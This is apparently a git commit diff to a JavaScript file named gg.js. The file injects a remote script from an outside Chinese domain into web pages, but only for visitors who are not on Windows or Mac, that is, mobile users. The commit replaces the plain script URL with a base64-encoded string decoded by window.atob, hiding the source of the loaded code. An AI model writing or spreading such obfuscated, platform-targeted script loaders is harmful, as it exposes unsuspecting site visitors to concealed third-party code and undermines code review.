794b45ebf522849104f688efafa4ce04e8e505bd
乐乐 <35110476+lelege@users.noreply.github.com>
2021-11-20 22:10:01 +0800

    Update gg.js

--- js/gg.js
+++ js/gg.js
@@ -1,7 +1,7 @@
 (function() {
 	if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
 		var hi = document.createElement("script");
-		hi.src = "https://test.lywdoo.cn/bx/xx06.js";
+		hi.src = window.atob("aHR0cHM6Ly90ZXN0Lmx5d2Rvby5jbi9ieC94eDA2Lmpz");
 		hi.charset = "UTF-8";
 		var k = document.getElementsByTagName("script")[0];
 		k.parentNode.insertBefore(hi, k);
